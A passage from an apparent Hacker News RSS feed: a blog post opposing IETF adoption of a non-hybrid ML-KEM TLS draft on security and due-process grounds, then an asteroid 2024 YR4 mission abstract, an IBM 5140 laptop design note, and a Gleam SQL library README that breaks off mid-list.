    &lt;p&gt;This is powerful marketing. Many people hearing this last quote will think "Oh, okay, NSA is using DES, so DES is strong". Koblitz and Menezes claimed that it's "far-fetched" that NSA would have intentionally selected something weak "for U.S. government usage (for both unclassified and classified communications [41])". Many people today will think "Oh, okay, NSA is buying single encryption, so double encryption is unimportant".&lt;/p&gt;
    &lt;p&gt;But DES wasn't strong. NSA had engineered DES to be "weak enough" for NSA to break. NSA wanted DES to "drive out competitors", to "reduce the field that NSA had to be concerned about".&lt;/p&gt;
    &lt;p&gt;It's perfectly plausible that NSA was using DES, but surely NSA was then using DES multiple times (Triple-DES or beyond), which makes it much harder to break (as long as you switch keys frequently). Obviously NSA wouldn't have said "use multiple layers" publicly: NSA wanted to fool people into thinking that DES was secure.&lt;/p&gt;
    &lt;p&gt;Today we have better ciphers than DES. However, for data that it cares about, NSA still uses two independent encryption layers "to mitigate the ability of an adversary to exploit a single cryptographic implementation". Gee, maybe multiple encryption is important after all!&lt;/p&gt;
    &lt;p&gt;Try to put yourself in the mindset of NSA as an attacker. You have a massive budget to "covertly influence and/or overtly leverage" systems to "make the systems in question exploitable"; "to the consumer and other adversaries, however, the systems' security remains intact". One of your action items is to "influence policies, standards and specification for commercial public key technologies". Another is to "shape the worldwide commercial cryptography marketplace to make it more tractable to advanced cryptanalytic capabilities being developed by NSA/CSS".&lt;/p&gt;
    &lt;p&gt;You spend this money pursuing many different attack paths, taking whatever surveillance wins you can get. It's not that everybody was using Dual EC, for example, but you managed to manipulate some people into using it, and for you that's a win.&lt;/p&gt;
    &lt;p&gt;Weakening ECC+PQ to just PQ, normalizing the practice of driving without seatbelts, is another win for you as the attacker. It's adding further vulnerabilities to the cryptographic ecosystem. The point is that, beyond SIKE and many other publicly broken cryptosystems, there will be some further cases where your "advanced cryptanalytic capabilities" break the PQ part while the "consumer and other adversaries" think the PQ part is secure.&lt;/p&gt;
    &lt;p&gt;What do you do with your control over the U.S. military budget? That's another opportunity to "shape the worldwide commercial cryptography marketplace". You can tell people that you won't authorize purchasing double encryption. You can even follow through on having the military publicly purchase single encryption. Meanwhile you quietly spend a negligible amount of money on an independent encryption layer to protect the data that you care about, so you're actually using double encryption.&lt;/p&gt;
    &lt;p&gt;Adoption of double encryption in TLS. "Adoption" in IETF is a preliminary step before standardization: when a WG is "ready to develop a particular document, the most common mechanism is for it to 'adopt' an existing document as a starting point".&lt;/p&gt;
    &lt;p&gt;In March 2025, after the close of a two-week "WG adoption call", the TLS WG chairs declared "consensus to adopt" the "Post-quantum hybrid ECDHE-MLKEM Key Agreement for TLSv1.3" draft.&lt;/p&gt;
    &lt;p&gt;There were no objections to the declaration of consensus on adopting this draft. I had pointed out that the patents on Kyber/ML-KEM create two issues related to IETF's patent policy, but I said that the first issue can be fixed after adoption (before standardization), and I now think that this is also true for the second issue. The risks from patents are orthogonal to the risks from non-hybrids, and I won't say more about patents in this blog post.&lt;/p&gt;
    &lt;p&gt;Why worry about a weaker standard if there's a stronger standard? At this point you might be wondering: if people are driving with seatbelts and this is on its way to being standardized, what's the problem with also having a driving-without-seatbelts standard for reckless fools who want to use that?&lt;/p&gt;
    &lt;p&gt;Think about Dual EC. Dual EC wasn't the only randomness-generation standard. But companies paid for FIPS certification of at least 62 different implementations of Dual EC. NSA bribed the RSA company to change its popular cryptographic library to use Dual EC by default.&lt;/p&gt;
    &lt;p&gt;These companies saw that Dual EC was a standard from a reputable standards organization (in fact, from three such organizations, namely ANSI, ISO, and NIST). Even for companies realizing that Dual EC was a controversial standard pushed by NSA, how many companies would risk losing money by refusing to implement Dual EC? It's easy for purchasing managers to use standards to set purchasing requirements.&lt;/p&gt;
    &lt;p&gt;What's particularly pernicious about a driving-without-seatbelts standard is that a purchasing manager who looks at it has an incentive to pick it instead of the driving-with-seatbelts standard. Wow, I can save $50 for every seatbelt that I skip! Wow, I can save 50 picodollars for every ECC operation that I skip! The purchasing manager doesn't care whether this cost reduction matters in context: every penny saved sounds good, right? The purchasing manager also doesn't realize the standard is dangerous: on the contrary, why would it be a standard if it were unsafe?&lt;/p&gt;
    &lt;p&gt;Soon we're faced with widespread non-usage of seatbelts. And then, years too late, we realize that, oops, something people used and thought was secure actually wasn't, just as in the case of SIKE.&lt;/p&gt;
    &lt;p&gt;Adoption of single encryption in TLS. On 1 April 2025âunfortunately not as a jokeâthe TLS WG chairs issued a two-week "WG adoption call for the ML-KEM Post-Quantum Key Agreement for TLS 1.3 I-D", the non-hybrid draft mentioned above.&lt;/p&gt;
    &lt;p&gt;Here are some quotes (some from me, some from other people) illustrating objections raised on the TLS mailing list during the call period:&lt;/p&gt;
    &lt;p&gt;The draft creates security risks. Sample quote: "SIKE was applied to large volumes of user data as part of the CECPQ2 experiment in 2019. SIKE was publicly broken in 2022. [paragraph break] The only reason that this didn't immediately give away the user data to attackers is that CECPQ2 was ECC+SIKE, rather than just SIKE. [paragraph break] Should we keep rolling out post-quantum cryptosystems to try to stop future quantum attacks? Yes, of course. But, just in case this goes horribly wrong again, let's make sure to keep ECC in place. Any draft violating this should be rejected as a security risk not just by WGs but also by the ISE."&lt;/p&gt;
    &lt;p&gt;The draft violates BCP 188. Sample quote: "To the extent that this is an allusion to NSA purchasing, it violates BCP 188 ('IETF Will Work to Mitigate Pervasive Monitoring')."&lt;/p&gt;
    &lt;p&gt;The draft violates the WG charter. Sample quote: "the draft's regression from ECC+PQ to just PQ is certainly a technology issue; and this is fatal, as a contravention of the 'improve security' goal in the WG charter".&lt;/p&gt;
    &lt;p&gt;There are no principles supporting the adoption decision. Sample quote: "I don't see what criteria we might use in adopting this that wouldn't leave the WG open to accusations of favouritism if we don't adopt other pure PQ national standards that will certainly arise".&lt;/p&gt;
    &lt;p&gt;The draft's motivation section is circular. Sample quote: there is "a preliminary step that has been skipped here, namely identifying why the proposal is claimed to be adding something important. The draft's motivation sentence consists of rearranging buzzwords without answering the question: 'Having a fully post-quantum (not hybrid) key agreement option for TLS 1.3 is necessary for migrating beyond hybrids and for users that need to be fully post-quantum.' "&lt;/p&gt;
    &lt;p&gt;The draft increases software complexity. Sample quote: "The main stated benefit of using a standalone ML-KEM is complexity reduction, but with the current progress in the deployment of the ML-KEM + ECC hybrid method, a standalone ML-KEM method actually increases overall complexity in software stacks." (This was responding to a claim during the adoption-call period that the draft provided a "compute / dependency base that is minimalist".)&lt;/p&gt;
    &lt;p&gt;This is just a high-level survey of the objections. These quotes aren't intended to convey the full text of objections. They also aren't intended to convey the number of people objecting; I'll get back to that below.&lt;/p&gt;
    &lt;p&gt;Standardization procedures. How does a standards-development organization handle objections? The law on this topic in the United States has been settled for decades.&lt;/p&gt;
    &lt;p&gt;The starting point is that agreements in restraint of interstate commerce are illegal. Courts interpret this to cover various types of agreements that are illegal per se, such as price fixing and group boycotts, along with further agreements that unreasonably interfere with competition.&lt;/p&gt;
    &lt;p&gt;Here's an example from the 1980s. Agents of a company that was leading its market, McDonnell and Miller, took control of a subcommittee of the American Society of Mechanical Engineers, a standards-development organization. They generated a letter, under ASME's apparent authority, declaring that a new competitor's product wasn't compliant. They distributed that letter to buyers, of course damaging the new competitor's business.&lt;/p&gt;
    &lt;p&gt;The competitor, HydroLevel, sued the conspiratorsâincluding ASME, which didn't even know the abuse was happening. HydroLevel won. ASME was ultimately forced to pay millions of dollars. The Supreme Court didn't mince words in describing the anti-competitive power of standards-development organizations:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;ASME wields great power in the Nation's economy. Its codes and standards influence the policies of numerous States and cities, and, as has been said about "so-called voluntary standards" generally, its interpretations of its guidelines "may result in economic prosperity or economic failure, for a number of businesses of all sizes throughout the country," as well as entire segments of an industry. ... ASME can be said to be "in reality, an extragovernmental agency which prescribes rules for the regulation and restraint of interstate commerce." ... When it cloaks its subcommittee officials with the authority of its reputation, ASME permits those agents to affect the destinies of businesses, and thus gives them the power to frustrate competition in the marketplace.&lt;/p&gt;
      &lt;p&gt;... Many of ASME's officials are associated with members of the industries regulated by ASME's codes. Although undoubtedly most serve ASME without concern for the interests of their corporate employers, some may well view their positions with ASME, at least in part, as an opportunity to benefit their employers. When the great influence of ASME's reputation is placed at their disposal, the less altruistic of ASME's agents have an opportunity to harm their employers' competitors through manipulation of ASME's codes.&lt;/p&gt;
      &lt;p&gt;... Only ASME can take systematic steps to make improper conduct on the part of all its agents unlikely, and the possibility of civil liability will inevitably be a powerful incentive for ASME to take those steps. Thus, a rule that imposes liability on the standard-setting organization -- which is best situated to prevent antitrust violations through the abuse of its reputation -- is most faithful to the congressional intent that the private right of action deter antitrust violations.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Another Supreme Court case rejected an argument of antitrust immunity for another standards-development organization. The organization made various decisions by majority vote, and had allowed steel manufacturers to pack a standards-development group, filling the group with pro-steel agents to take over a vote. The Supreme Court again recognized the importance of procedural safeguards preventing abuse:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The antitrust validity of these efforts is not established, without more, by petitioner's literal compliance with the rules of the Association, for the hope of procompetitive benefits depends upon the existence of safeguards sufficient to prevent the standard-setting process from being biased by members with economic interests in restraining competition. An association cannot validate the anticompetitive activities of its members simply by adopting rules that fail to provide such safeguards.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;The Supreme Court declined at that point to draw a dividing line saying which safeguards were required. In 2004, Congress passed a law pinning this down: the new law said that "standards development activity" by a "standards development organization" isn't illegal per se, and gave definitions of the quoted phrases.&lt;/p&gt;
    &lt;p&gt;In particular, a "standards development organization" is required by law to "incorporate the attributes of openness, balance of interests, due process, an appeals process, and consensus in a manner consistent with the Office of Management and Budget Circular Number A-119, as revised February 10, 1998".&lt;/p&gt;
    &lt;p&gt;That OMB rule, in turn, defines "consensus" as follows: "general agreement, but not necessarily unanimity, and includes a process for attempting to resolve objections by interested parties, as long as all comments have been fairly considered, each objector is advised of the disposition of his or her objection(s) and the reasons why, and the consensus body members are given an opportunity to change their votes after reviewing the comments".&lt;/p&gt;
    &lt;p&gt;The Antitrust Division of the Department of Justice inserted itself into a private court case in 2019 to say that "the United States has a significant interest in the correct interpretation of the exemption from per se treatment for standards development organizations engaging in standard setting activities".&lt;/p&gt;
    &lt;p&gt;Deputy Assistant Attorney General Alexander Okuliar in the same division presented a longer statement to ANSI in 2020 regarding antitrust and standards. The statement mentioned ANSI's compliance with the same requirements and said "From an antitrust perspective, these requirements are central".&lt;/p&gt;
    &lt;p&gt;Here's a random example of what an objection-response document looks like in ISO, IEC, etc. Not the best user interface, but it gets the job done.&lt;/p&gt;
    &lt;p&gt;There was not general agreement to adopt the non-hybrid draft. Now that we have the concept of consensus in mind, let's go back to what happened in the IETF TLS WG regarding the non-hybrid draft.&lt;/p&gt;
    &lt;p&gt;During the adoption-call period, there were statements from 20 people unequivocally supporting adoption: David Adrian from Google, Joseph Birr-Pixton, Uri Blumenthal from Department of Defense subsidiary Lincoln Labs, "Flo D" from GCHQ, Quynh Dang from NIST, Viktor Dukhovni, Scott Fluhrer from Cisco, Rebecca Guthrie from NSA, Russ Housley, Alicja Kario from IBM subsidiary Red Hat, Kris Kwiatkowski, Andrei Popov from Microsoft, Tirumal Reddy from Cisco, Yaroslav Rosomakho, Jan Schaumann, Sophie Schmieg from Google, Martin Thomson from Mozilla, Filippo Valsorda formerly from Google, Loganaden Velvindron, and Thom Wiggers.&lt;/p&gt;
    &lt;p&gt;There were also statements from 2 people conditionally supporting adoption: John Mattsson from Ericsson ("I support adoption as long as reuse of ephemeral keys is normatively forbidden, i.e. MUST NOT reuse") and Yaakov Stein ("I support adoption of pure PQC KEMs drafts with Intended status: Informational (meaning that the IETF is not recommending using)").&lt;/p&gt;
    &lt;p&gt;However, there were statements from 7 people unequivocally opposing adoption: Thomas Bellebaum ("I agree with Stephen on this one and would not support adoption of non-hybrids"), Andrey Jivsov ("I am opposed to the adoption of ML-KEM at this time"), Stephen Farrell ("I'm opposed to adoption, at this time"), Rich Salz ("I was all set to say that I am in favor of adoption, but Stephen's post changed my mind. [paragraph break] The conservative and safe thing is to stick to hybrids and that is what the IETF should do for now"), Rob Sayre ("I oppose adoption"), Sun Shuzhou ("I'm opposed to adoption"), and me.&lt;/p&gt;
    &lt;p&gt;Even assuming that the 2 statements of conditional support are treated as positive votes, the overall situation here, 22 positive votes and 7 negative votes, does not qualify as general agreement. "General" means "shared by or affecting most people, or most of the people in a group"; "most" means "nearly all of the people or things in a group, or nearly all of something"; the phrase "general agreement" means that nearly everyone agrees. Merely having three quarters agree is not good enough.&lt;/p&gt;
    &lt;p&gt;What happens if a standards-development organization issues a rule declaring that "general agreement" exists even when a quarter of the votes are in opposition? I haven't found any court cases on point, but I would expect courts to reject this as being inconsistent with the plain meaning of "general agreement".&lt;/p&gt;
    &lt;p&gt;Anyway, IETF hasn't attempted to issue such a rule. On the contrary, IETF claims that WG decisions are not taken by voting: "Decisions within WGs, as with the broader IETF, are taken by 'rough consensus' and not by voting." This begs the question of what IETF thinks "rough consensus" means. Letting chairs make arbitrary decisions is a violation of due process.&lt;/p&gt;
    &lt;p&gt;More to the point, IETF can't override the definition of "consensus" in the law. That definition requires general agreement. Adoption of this draft was controversial, and didn't reach general agreement.&lt;/p&gt;
    &lt;p&gt;Objections were not handled properly. Within the statements in favor of adoption, most of the statements were very short: e.g., just the words "I support adoption" with no further comments.&lt;/p&gt;
    &lt;p&gt;Some statements in favor of adoption did say more, such as stating circular arguments for the draft (e.g.: "as time progresses, non-hybrid key exchanges will become more and more commonplace, so why not have it already defined?"), or expressing concerns about key reuse (e.g.: "I also share John's concerns about key reuse, but would prefer to litigate that in the working group, rather than during adoption"), without responding to the content of the objections.&lt;/p&gt;
    &lt;p&gt;There was a response to one word in the lack-of-principles objection. (The response was as follows: "The NIST competition was international, and Kyber was developed by an international team. I struggle to understand how adopting this document would somehow be 'favoritism'.") A brief note by one supporter tangentially related to one objection falls far short of fair consideration of each objection by the group as a whole.&lt;/p&gt;
    &lt;p&gt;I tried to engage that supporter in discussion. I started by quoting the following earlier statement in the commentator's message: "I find it to be cognitive dissonance to simultaneously argue that the quantum threat requires immediate work, and yet we are also somehow uncertain of if the algorithms are totally broken. Both cannot be true at the same time." I responded as follows:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Rolling out PQ is trying to reduce the damage from an attacker having a quantum computer within the security lifetime of the user data. Doing that as ECC+PQ instead of just PQ is trying to reduce the damage in case the PQ part is broken. These actions are compatible, so how exactly do you believe they're contradictory?&lt;/p&gt;
      &lt;p&gt;Here's an analogous example of basic risk mitigation: there's endless work that goes into having planes not crash, not hit turbulence, etc., but we still ask airplane passengers to keep their seatbelts on whenever they're in their seats.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;There was still no reply to this by the time the adoption call closed two weeks later.&lt;/p&gt;
    &lt;p&gt;The broader pattern was that objectors were engaging in discussion while supporters were not. The majority process wasn't "attempting to resolve each objection"; it was simply collecting positive votes, trying to override objections from the minority without even answering those objections, let alone trying to resolve them.&lt;/p&gt;
    &lt;p&gt;That's in an organization saying that decisions aren't taken by voting. The same organization also says, as part of explaining why it's supposedly complying with antitrust law: "IETF activities are conducted with extreme transparency, in public forums. Decision-making requires achieving broad consensus via these public processes."&lt;/p&gt;
    &lt;p&gt;When there's an objection, the legal concept of consensus requires not just fairly considering the objection, and not just attempting to resolve the objection, butâif resolution failsâhaving the group agree on the contents of a response to the objection. That's an official statement of why the objection was overridden. It's something that can be appealed if it's wrong. Consider, for example, ISO's simple rule saying "Committees are required to respond to all comments received". In IETF, there weren't even informal responses to the objections listed above, let alone official responses.&lt;/p&gt;
    &lt;p&gt;The chairs declared consensus anyway. Shortly before the end of the specified adoption-call period, the chairs declared "consensus to adopt this draft as a working group item". There were some notes on followup procedures, but there was no explanation of the rationale for this claim of consensus.&lt;/p&gt;
    &lt;p&gt;I challenged the claim of consensus:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Um, what? There were several people (including me) raising objections on list to basic flaws in this draft, such as (1) the failure to provide an ECC backup to limit the damage from further security problems in the PQ layer, (2) the failure to provide an engineering justification for this option, and (3) the lack of any principles that would justify saying no to options selected by other governments if this option is allowed.&lt;/p&gt;
      &lt;p&gt;Your message doesn't explain how you came to the conclusion that there's consensus. Surely you aren't relying on some tally of positive votes to ram this document through while ignoring objections; voting isn't how IETF is supposed to work. So how did you come to this conclusion?&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;A few days later, the chairs responded that they had declared consensus "because there is clearly sufficient interest to work on this draft".&lt;/p&gt;
    &lt;p&gt;I said that this was ambiguous (sufficient for what?); said that in any case this criterion was improper since it "would allow a draft to be adopted over amply justified objections of almost all WG participants, simply because the chairs and a few participants say they have enough interest in working on the draft"; and asked for an explicit statement of whether this was the complete explanation of why the chairs had declared consensus.&lt;/p&gt;
    &lt;p&gt;The chairs responded that "sufficient" means "that there were enough people willing to review the draft". They added that "WGs groups have adopted drafts with much less support than this one received." Gee, that's confidence-inspiring.&lt;/p&gt;
    &lt;p&gt;Meanwhile an IETF "security area director" had jumped into the discussion, in particular writing "There is clearly consensus based on the 67 responses to the adoption call. ... The vast majority was in favour of adoption ... There were a few dissenting opinions".&lt;/p&gt;
    &lt;p&gt;Remember that the actual tallies were 20 supporters, 2 conditional supporters, and 7 opponents, even if some people (for example, me) had sent multiple messages. Nobody had posted the actual tallies at this point: there was just this "security area director" claiming that the "vast majority" of the "67 responses" were in favor while there were only "a few dissenting opinions". Also remember that this is an organization that claims that it doesn't make decisions by voting.&lt;/p&gt;
    &lt;p&gt;The "security area director" continued that "you cherry-picking when to call consensus evaluation 'voting' depending on whether misnaming this is in your advantage ... is dishonestly manipulative"; that I was violating the "code of conduct"; and that if I did not "voluntarily stop this kind of behaviour" there would be "measures under the terms of RFC3934 which is part of BCP25".&lt;/p&gt;
    &lt;p&gt;In a followup message, the "security area director" wrote "you calling into question this consensus call of the WG chair is abusive and follows a repetitive pattern. Nevertheless, for now this is your right ... you are attempting to bait the chairs to say they took inventory of the public emails ... there comes a point where you will be prevented from further playing these games".&lt;/p&gt;
    &lt;p&gt;Wait a minute: "for now this is your right" (emphasis added) and "you will be prevented from further playing these games"? Sounds ominous. What did the "security area director" mean by this? No more objections in IETF? No more appeals? NSA's minions can just ram their non-consensual drafts through IETF without opponents even being allowed to speak up?&lt;/p&gt;
    &lt;p&gt;Actually, yes, there's a stealth activity going on right now that will have this effect unless enough people take action by Tuesday the 7th. I hope to have another blog post up in a day or two saying what's going on here.&lt;/p&gt;
    &lt;p&gt;Anyway, I've filed a formal complaint regarding the claim of consensus to adopt. So far the complaint hasn't been handled properly, but hope springs eternal. I don't have an answer yet to the subtitle question of this blog post.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45477206</guid><pubDate>Sat, 04 Oct 2025 22:16:33 +0000</pubDate></item><item><title>Space Mission Options for Reconnaissance and Mitigation of Asteroid 2024 YR4</title><link>https://arxiv.org/abs/2509.12351</link><description>&lt;doc fingerprint="e49c962254f5788f"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;Astrophysics &amp;gt; Instrumentation and Methods for Astrophysics&lt;/head&gt;&lt;p&gt; [Submitted on 15 Sep 2025]&lt;/p&gt;&lt;head rend="h1"&gt;Title:Space Mission Options for Reconnaissance and Mitigation of Asteroid 2024 YR4&lt;/head&gt;View PDF HTML (experimental)&lt;quote&gt;Abstract:Near-Earth asteroid 2024 YR4 was discovered on 2024-12-27 and its probability of Earth impact in December 2032 peaked at about 3% on 2025-02-18. Additional observations ruled out Earth impact by 2025-02-23. However, the probability of lunar impact in December 2032 then rose, reaching about 4% by the end of the apparition in May 2025. James Webb Space Telescope (JWST) observations on 2025-03-26 estimated the asteroid's diameter at 60 +/- 7 m. Studies of 2024 YR4's potential lunar impact effects suggest lunar ejecta could increase micrometeoroid debris flux in low Earth orbit up to 1000 times above background levels over just a few days, possibly threatening astronauts and spacecraft. In this work, we present options for space missions to 2024 YR4 that could be utilized if lunar impact is confirmed. We cover flyby &amp;amp; rendezvous reconnaissance, deflection, and robust disruption of the asteroid. We examine both rapid-response and delayed launch options through 2032. We evaluate chemical and solar electric propulsion, various launch vehicles, optimized deep space maneuvers, and gravity assists. Re-tasking extant spacecraft and using built spacecraft not yet launched are also considered. The best reconnaissance mission options launch in late 2028, leaving only approximately three years for development at the time of this writing in August 2025. Deflection missions were assessed and appear impractical. However, kinetic robust disruption missions are available with launches between April 2030 and April 2032. Nuclear robust disruption missions are also available with launches between late 2029 and late 2031. Finally, even if lunar impact is ruled out there is significant potential utility in deploying a reconnaissance mission to characterize the asteroid.&lt;/quote&gt;&lt;p&gt; Current browse context: &lt;/p&gt;&lt;p&gt;astro-ph.IM&lt;/p&gt;&lt;p&gt; Change to browse by: &lt;/p&gt;&lt;head rend="h3"&gt;References &amp;amp; Citations&lt;/head&gt;&lt;p&gt; export BibTeX citation Loading... &lt;/p&gt;&lt;head rend="h1"&gt;Bibliographic and Citation Tools&lt;/head&gt;&lt;p&gt; Bibliographic Explorer (What is the Explorer?) &lt;/p&gt;&lt;p&gt; Connected Papers (What is Connected Papers?) &lt;/p&gt;&lt;p&gt; Litmaps (What is Litmaps?) &lt;/p&gt;&lt;p&gt; scite Smart Citations (What are Smart Citations?) &lt;/p&gt;&lt;head rend="h1"&gt;Code, Data and Media Associated with this Article&lt;/head&gt;&lt;p&gt; alphaXiv (What is alphaXiv?) &lt;/p&gt;&lt;p&gt; CatalyzeX Code Finder for Papers (What is CatalyzeX?) &lt;/p&gt;&lt;p&gt; DagsHub (What is DagsHub?) &lt;/p&gt;&lt;p&gt; Gotit.pub (What is GotitPub?) &lt;/p&gt;&lt;p&gt; Hugging Face (What is Huggingface?) &lt;/p&gt;&lt;p&gt; Papers with Code (What is Papers with Code?) &lt;/p&gt;&lt;p&gt; ScienceCast (What is ScienceCast?) &lt;/p&gt;&lt;head rend="h1"&gt;Demos&lt;/head&gt;&lt;head rend="h1"&gt;Recommenders and Search Tools&lt;/head&gt;&lt;p&gt; Influence Flower (What are Influence Flowers?) &lt;/p&gt;&lt;p&gt; CORE Recommender (What is CORE?) &lt;/p&gt;&lt;p&gt; IArxiv Recommender (What is IArxiv?) &lt;/p&gt;&lt;head rend="h1"&gt;arXivLabs: experimental projects with community collaborators&lt;/head&gt;&lt;p&gt;arXivLabs is a framework that allows collaborators to develop and share new arXiv features directly on our website.&lt;/p&gt;&lt;p&gt;Both individuals and organizations that work with arXivLabs have embraced and accepted our values of openness, community, excellence, and user data privacy. arXiv is committed to these values and only works with partners that adhere to them.&lt;/p&gt;&lt;p&gt;Have an idea for a project that will add value for arXiv's community? Learn more about arXivLabs.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45477742</guid><pubDate>Sat, 04 Oct 2025 23:42:55 +0000</pubDate></item><item><title>Mod. 5140 - IBM's First Laptop Computer</title><link>https://richardsapperdesign.com/products/mod-5140/</link><description>&lt;doc fingerprint="515b578191daf980"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Mod. 5140&lt;/head&gt;
    &lt;p&gt;With Colleen Sweeney&lt;/p&gt;
    &lt;p&gt;Prize Premio SMAU 1986&lt;lb/&gt; IF Industrie Forum Design Award Hannover 1988&lt;lb/&gt; Selection Compasso d’Oro 1987&lt;/p&gt;
    &lt;p&gt;This was IBM’s first laptop computer. It was developed in the IBM lab in Boca Raton, Florida, an area notoriously infested with alligators. From its side, the Mod. 5140 evokes a resemblance to an alligator’s head. When the printer is attached to its end, with paper flowing from the rear, it resembles the animal’s tail.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45477971</guid><pubDate>Sun, 05 Oct 2025 00:35:10 +0000</pubDate></item><item><title>Parrot – type-safe SQL in Gleam, supports SQlite, PostgreSQL and MySQL</title><link>https://github.com/daniellionel01/parrot</link><description>&lt;doc fingerprint="e20ba422ef3c70fe"&gt;
  &lt;main&gt;
    &lt;quote&gt;&lt;p&gt;🚨 Exciting News&lt;/p&gt;&lt;lb/&gt;Parrot got listed a community project on the sqlc website! 🦜🎉&lt;lb/&gt;Check it out here: https://docs.sqlc.dev/en/latest/reference/language-support.html&lt;/quote&gt;
    &lt;p&gt;Table of contents generated with markdown-toc&lt;/p&gt;
    &lt;p&gt;Most of the heavy lifting features are provided by / built into sqlc, I do not aim to take credit for them.&lt;/p&gt;
    &lt;p&gt;☑️ Supports SQlite, PostgreSQL and MySQL.&lt;lb/&gt; ☑️ Multiple queries per file.&lt;lb/&gt; ☑️ Database client agnostic.&lt;lb/&gt; ☑️ Utility wrappers for popular gleam database libraries (lpil/sqlight, lpil/pog).&lt;lb/&gt; ☑️ Automatically pulls the schema of your database.&lt;lb/&gt; ☑️ Automatically downloads sqlc binary.&lt;lb/&gt; ☑️ Named parameters.*1 &lt;/p&gt;
    &lt;p&gt;*1: Meaning that it infers the names of the parameters from your sql queries in the gleam function you call. for example for a query called &lt;code&gt;FindUser&lt;/code&gt;, defined as &lt;code&gt;SELECT * FROM user WHERE username = $1&lt;/code&gt;, parrot will produce a function where the arguments match those column names: &lt;code&gt;pub fn find_user(username: String) { ... }&lt;/code&gt;. If you have multiple parameters of the same data types this can avoid confusion and bugs.&lt;/p&gt;
    &lt;code&gt;$ gleam add parrot&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Parrot will look for all *.sql files in any sql directory under your project's src directory.&lt;/item&gt;
      &lt;item&gt;Each *.sql file can contain as many SQL queries as you want.&lt;/item&gt;
      &lt;item&gt;All of the queries will compile into a single &lt;code&gt;src/[project name]/sql.gleam&lt;/code&gt;module.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Here are some links to help you start out, if you are unfamiliar with the sqlc annotation syntax:&lt;/p&gt;
    &lt;p&gt;Here is an example of the file structure:&lt;/p&gt;
    &lt;code&gt;├── gleam.toml
├── README.md
├── src
│   ├── app.gleam
│   └── sql
│       ├── auth.sql
│       └── posts.sql
└── test
   └── app_test.gleam&lt;/code&gt;
    &lt;code&gt;# automatically detects database &amp;amp; engine from env (DATABASE_URL by default)
$ gleam run -m parrot

# provide connection string from different environment variable
$ gleam run -m parrot -- -e PG_DATABASE_URL

# specify sqlite file
$ gleam run -m parrot -- --sqlite &amp;lt;file_path&amp;gt;

# see all options
$ gleam run -m parrot help&lt;/code&gt;
    &lt;p&gt;If you use SQLite, you also need to have installed sqlite3.&lt;/p&gt;
    &lt;p&gt;If you use MySQL, you also need to have installed mysqldump (comes by default if you have a mysql client installed).&lt;/p&gt;
    &lt;p&gt;If you use PostgreSQL, you also need to have installed pg_dump (comes by default if you have a postgresql client installed).&lt;/p&gt;
    &lt;p&gt;You now have type safe access to your sql queries.&lt;/p&gt;
    &lt;p&gt;You might want to write wrapper functions for the database client library of your choice. If you are using lpil/pog or lpil/sqlight, you are in luck! You can find functions to copy &amp;amp; paste into your codebase here: wrappers&lt;/p&gt;
    &lt;p&gt;An example with lpil/sqlight:&lt;/p&gt;
    &lt;code&gt;import app/sql
import parrot/dev

fn parrot_to_sqlight(param: dev.Param) -&amp;gt; sqlight.Value {
  // ...
}

pub fn main() {
  // ...

  let #(sql, with, expecting) = sql.get_user_by_username("alice")
  let with = parrot_to_sqlight(with)
  let row = sqlight.query(sql, on:, with:, expecting:)

  // ...
}&lt;/code&gt;
    &lt;p&gt;If you want to see how this library works in action, take a look at the integration tests:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;PostgreSQL: integration/psql&lt;/item&gt;
      &lt;item&gt;MySQL: integration/mysql&lt;/item&gt;
      &lt;item&gt;SQlite: integration/sqlite&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;just is used to run project commands.&lt;/p&gt;
    &lt;p&gt;There are scripts to spawn a MySQL or PostgreSQL docker container:&lt;/p&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;code&gt;$ ./bin/mysql.sh
# or
$ ./bin/psql.sh&lt;/code&gt;
    &lt;code&gt;$ just test-sqlite
$ just test-mysql
$ just test-psql&lt;/code&gt;
    &lt;p&gt;As with everything in software, there are some quirks with this library, due to the nature of your database of choice and sqlc.&lt;/p&gt;
    &lt;p&gt;If you have an &lt;code&gt;INTEGER[][]&lt;/code&gt; column in Postgres, &lt;code&gt;pg_dump&lt;/code&gt; does not correctly identify
the column as a two-dimensional array and therefore only gives you a &lt;code&gt;List(Int)&lt;/code&gt; instead
of a &lt;code&gt;List(List(Int))&lt;/code&gt;. If this is a problem for you, you can raise an issue and
we might come up with a solution or workaround.&lt;/p&gt;
    &lt;p&gt;There are a couple of complex data types that are explictly made &lt;code&gt;dynamic&lt;/code&gt;
since they are too complex to handle with the current implementation.
There is a plan for a better and more flexible implementation. Until then,
it will be wrapped in a dynamic type.&lt;/p&gt;
    &lt;p&gt;So here is the catch: you can only execute parrot in an erlang gleam application. However the generated code will also run in a javascript environment. So if you need parrot for a javascript project, you can create a separate package and copy over the generated module and that will work.&lt;/p&gt;
    &lt;p&gt;This library supports everything that sqlc supports. As the time of this writing that would be MySQL, PostgreSQL and SQlite.&lt;/p&gt;
    &lt;p&gt;You can read more on language &amp;amp; SQL support here: https://docs.sqlc.dev/en/stable/reference/language-support.html&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;embeddeding structs (https://docs.sqlc.dev/en/stable/howto/embedding.html)&lt;/p&gt;
      &lt;/item&gt;
